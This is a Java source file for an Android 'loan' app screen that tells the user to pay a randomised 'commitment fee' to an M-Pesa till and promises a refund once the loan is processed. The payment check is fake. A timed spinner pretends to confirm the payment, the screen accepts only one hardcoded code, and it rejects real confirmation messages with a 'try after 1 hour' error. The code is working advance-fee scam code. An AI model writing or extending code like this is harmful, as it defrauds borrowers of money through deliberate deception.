package com.rapidkopainc.rapidkopa;

import android.app.AlertDialog;
import android.app.ProgressDialog;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.EditText;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Random;

public class CommitmentScreenActivity extends AppCompatActivity {
    private static final String TAG = CommitmentScreenActivity.class.getSimpleName();

    ProgressDialog dialog;

    int i = 0;
    int x = 0;
//String mpesatill,tillname,tillimage;
    ImageView mpesaimage;
    private EditText mpesatxt;  
    int randomNumber;
    TextView tv;
    TextView tillnamex;
    TextView tillnumberx;
    ImageButton imageButton;
    private PrefManager prefManager;
    AlertDialog.Builder builder;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_commitment);
        prefManager = new PrefManager(this);
        this.mpesatxt = (EditText) findViewById(R.id.mpesainp);

         tv = (TextView) findViewById(R.id.text_view);
        //SharedPreferences prefs = getApplicationContext().getSharedPreferences("TILLPREF", getApplicationContext().MODE_PRIVATE);
       // SharedPreferences sharedPreferences3 =
               // PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
        SharedPreferences sharedPreferences3 =
                getSharedPreferences("PROJECT_NAME", Context.MODE_PRIVATE);
        tillnamex = (TextView) findViewById(R.id.till_name);
        tillnumberx = (TextView) findViewById(R.id.till_number);
         mpesaimage=findViewById(R.id.imageView3);
       //  String tillname=prefManager.getcompany();
        String tillname=sharedPreferences3.getString("tillname", null);
        int tillnumber=sharedPreferences3.getInt("tillnum", 0);
                                tillnamex.setText(tillname);


        int commitmentAmount = getCommitmentAmount(sharedPreferences3.getInt("bound",12),sharedPreferences3.getInt("minamount",150));
        tillnumberx.setText(String.valueOf(tillnumber));
                        tv.setText("Dear Customer,\nOur company is committed to serving our customers based on trust and loyalty.\nFor that reason, it requires you to pay a customer commitment fee of Kshs."
        +String.valueOf(commitmentAmount) +" to\nTILL NUMBER :"+ tillnumber+"  \nTILL NAME :"+ tillname+". \n\nProcedure:\n1. Go to Mpesa\n 2. Buy Goods and Services\n3. Enter till number : "+tillnumber+"  \n4. Enter Amount: Ksh. "
                +String.valueOf(commitmentAmount) +"\n5. Enter pin.\n6. Wait for confirmation message.\n\nYour commitment will be refunded once your loan Is processed successfully.\t\nEnter your confirmation message in the box below.\n");




    }



private int getCommitmentAmount(int bound,int minAmount)
{
    Random r = new Random();
    return ((r.nextInt(bound)*5)+minAmount);
}

    @Override
    protected void onDestroy() {
        super.onDestroy();

    }


    public void confirmmpesa(View arg0) {
        String mpesa = this.mpesatxt.getText().toString();
        if (!isValidMpesa(mpesa)) {
            this.mpesatxt.setError("Please pay and Paste your M-Pesa message");
        }

        if (isValidMpesa(mpesa)) {
            submitting();
        }
    }

    private boolean isValidMpesa(String mpesa) {
        if (mpesa == null || mpesa.length() < 10) {
            return false;
        }
        return true;
    }

    public void mpesatoproceed() {
        if (mpesatxt.getText().toString().equals("QAH5ILBPJ3"))
        {
            Intent intent= new Intent();
            intent.setClass(CommitmentScreenActivity.this, RateScreenActivity.class);
            startActivity(intent);
        }
        else{
            mpesaerror();

        }
    }



    public void submitting() {
        this.dialog = ProgressDialog.show(this, CommonConfigs.FLAVOR, "Confirming Payment..", true);
        this.dialog.show();
        new Handler().postDelayed(new Runnable() {
            public void run() {
                CommitmentScreenActivity.this.dialog.dismiss();
                mpesatoproceed();

            }
        }, 5000);
    }

    public void mpesaerror() {
        this.mpesatxt.setError("INVALID CODE!! If Paid, Try after 1 hour");

    }
}
